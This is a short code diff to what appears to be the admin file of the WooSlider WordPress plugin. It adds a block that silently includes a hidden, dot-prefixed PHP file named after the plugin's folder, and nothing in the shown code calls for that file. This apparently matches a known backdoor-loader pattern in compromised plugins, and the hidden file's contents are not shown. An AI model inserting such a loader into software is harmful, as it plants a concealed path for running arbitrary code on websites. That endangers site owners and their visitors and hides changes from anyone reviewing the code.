@@ -31,6 +31,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - generate_conditional_fields_slides()
  * - generate_conditional_fields_posts()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_Admin {
 	/**
 	 * Constructor.
